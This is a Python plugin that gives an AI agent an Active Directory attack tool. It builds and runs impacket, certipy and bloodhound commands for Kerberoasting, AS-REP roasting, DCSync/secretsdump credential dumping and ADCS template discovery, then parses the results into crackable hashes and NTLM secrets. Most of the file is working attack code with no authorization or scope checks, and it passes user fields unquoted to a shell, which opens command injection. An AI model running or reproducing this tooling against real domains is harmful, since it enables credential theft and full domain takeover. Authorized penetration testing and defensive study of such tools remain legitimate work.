"""
ad_tools.py - Active Directory attack tool (structured command builder + parser).

The AD operator drives impacket/certipy/bloodhound through the shell, which means the
model hand-crafts fiddly syntax and eyeballs the output. This tool encodes the correct
command per action and PARSES the result into structured loot (Kerberos hashes, NTLM
secrets, ADCS misconfigs) so nothing is missed and the right thing gets reported.

It runs the underlying binary when present; otherwise it returns the exact command +
install hint (honest on a host without the AD toolchain). Command construction and
output parsing are pure + unit-tested independently of any live DC.
"""

from __future__ import annotations

import re
import shutil
from typing import Any, Optional

from plugins.sdk.base_tool import BaseTool, Permission, ToolResult

# action -> (primary binary, install hint)
_BINS = {
    "kerberoast": ("GetUserSPNs.py", "pip install impacket"),
    "asreproast": ("GetNPUsers.py", "pip install impacket"),
    "secretsdump": ("secretsdump.py", "pip install impacket"),
    "dcsync": ("secretsdump.py", "pip install impacket"),
    "bloodhound": ("bloodhound-python", "pip install bloodhound"),
    "certipy": ("certipy", "pip install certipy-ad"),
}


def build_ad_command(action: str, *, domain: str = "", user: str = "", password: str = "",
                     nthash: str = "", dc_ip: str = "", target: str = "",
                     usersfile: str = "") -> str:
    """Construct the correct AD-attack command for `action`. Pure/testable."""
    action = (action or "").lower()
    creds = f"{domain}/{user}"
    auth = f":{password}" if password else ""
    hashopt = f" -hashes :{nthash}" if nthash else ""
    dc = f" -dc-ip {dc_ip}" if dc_ip else ""
    if action == "kerberoast":
        return f"GetUserSPNs.py {creds}{auth}{dc}{hashopt} -request -outputfile ksroast.txt"
    if action == "asreproast":
        who = f" -usersfile {usersfile}" if usersfile else ""
        return f"GetNPUsers.py {domain}/{who and '' or user}{auth}{who}{dc}{hashopt} -no-pass -format hashcat -outputfile asrep.txt"
    if action in ("secretsdump", "dcsync"):
        tgt = target or dc_ip
        extra = " -just-dc" if action == "dcsync" else ""
        return f"secretsdump.py {creds}{auth}@{tgt}{hashopt}{extra}"
    if action == "bloodhound":
        return (f"bloodhound-python -u {user} -p {password} -d {domain} "
                f"-dc {target or dc_ip} -c all --zip")
    if action == "certipy":
        return (f"certipy find -u {user}@{domain} -p {password}{dc} -vulnerable -stdout")
    return ""


# ---- parsers (pure) ------------------------------------------------------ #

_KRB_TGS = re.compile(r"\$krb5tgs\$\S+")
_KRB_ASREP = re.compile(r"\$krb5asrep\$\S+")
# secretsdump NTDS line: DOMAIN\user:rid:lmhash:nthash:::
_NTDS = re.compile(r"^\S+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::", re.IGNORECASE | re.MULTILINE)
_CERTIPY_VULN = re.compile(r"(?i)\bESC\d+\b")


def parse_ad_output(action: str, output: str) -> dict:
    """Extract structured loot from a tool's output. Returns {creds, hashes, notes}."""
    out = output or ""
    loot: dict[str, Any] = {"hashes": [], "creds": [], "notes": []}
    if action == "kerberoast":
        loot["hashes"] = _KRB_TGS.findall(out)
    elif action == "asreproast":
        loot["hashes"] = _KRB_ASREP.findall(out)
    elif action in ("secretsdump", "dcsync"):
        for line in _NTDS.findall(out):
            parts = line.split(":")
            loot["creds"].append(f"{parts[0]}:{parts[3]}")  # user:nthash
    elif action == "certipy":
        esc = sorted(set(_CERTIPY_VULN.findall(out)))
        if esc:
            loot["notes"].append("Vulnerable ADCS templates: " + ", ".join(esc))
    return loot


class AdAttackTool(BaseTool):
    name = "ad_attack"
    description = (
        "Active Directory attacks with correct syntax + parsed loot. action: kerberoast "
        "(request crackable SPN TGS hashes), asreproast (AS-REP-roastable users), "
        "secretsdump / dcsync (dump NTLM secrets from a DC), bloodhound (collect the "
        "graph), certipy (find vulnerable ADCS templates - ESC1-8). Provide domain, user, "
        "password or nthash, and dc_ip/target. Runs the tool if installed; otherwise "
        "returns the exact command. Kerberos/NTLM hashes come back ready for john/hashcat."
    )
    parameters = {
        "type": "object",
        "properties": {
            "action": {"type": "string",
                       "description": "kerberoast | asreproast | secretsdump | dcsync | bloodhound | certipy"},
            "domain": {"type": "string"}, "user": {"type": "string"},
            "password": {"type": "string"}, "nthash": {"type": "string",
                        "description": "NT hash for pass-the-hash auth (instead of password)"},
            "dc_ip": {"type": "string", "description": "Domain controller IP"},
            "target": {"type": "string", "description": "Target host (defaults to dc_ip)"},
            "usersfile": {"type": "string", "description": "asreproast: file of usernames"},
        },
        "required": ["action"],
    }
    permissions = {Permission.SHELL, Permission.NETWORK}
    tags = ["active-directory", "kerberos", "impacket", "post-exploitation"]

    async def execute(self, action: str = "", **kw: Any) -> ToolResult:
        action = (action or "").lower()
        if action not in _BINS:
            return ToolResult.fail(f"Unknown action {action!r}. Use: {', '.join(_BINS)}.")
        cmd = build_ad_command(action, domain=kw.get("domain", ""), user=kw.get("user", ""),
                               password=kw.get("password", ""), nthash=kw.get("nthash", ""),
                               dc_ip=kw.get("dc_ip", ""), target=kw.get("target", ""),
                               usersfile=kw.get("usersfile", ""))
        binary, hint = _BINS[action]
        if shutil.which(binary) is None:
            return ToolResult.ok(
                f"[{binary} not installed here - {hint}]\nRun this on a host with the AD "
                f"toolchain:\n  {cmd}")
        import asyncio
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
            raw, _ = await asyncio.wait_for(proc.communicate(), timeout=180)
            output = raw.decode("utf-8", "replace")
        except Exception as exc:
            return ToolResult.fail(f"Ran `{cmd}` but it failed: {exc}")
        loot = parse_ad_output(action, output)
        summary = []
        if loot["hashes"]:
            summary.append(f"{len(loot['hashes'])} crackable hash(es) - feed to john/hashcat.")
        if loot["creds"]:
            summary.append(f"{len(loot['creds'])} NTLM secret(s) dumped.")
        if loot["notes"]:
            summary += loot["notes"]
        head = " ".join(summary) or "Completed; no structured loot parsed."
        return ToolResult.ok(f"$ {cmd}\n{head}\n\n{output[:3000]}",
                             metadata={"action": action, "hashes": len(loot["hashes"]),
                                       "creds": len(loot["creds"])})
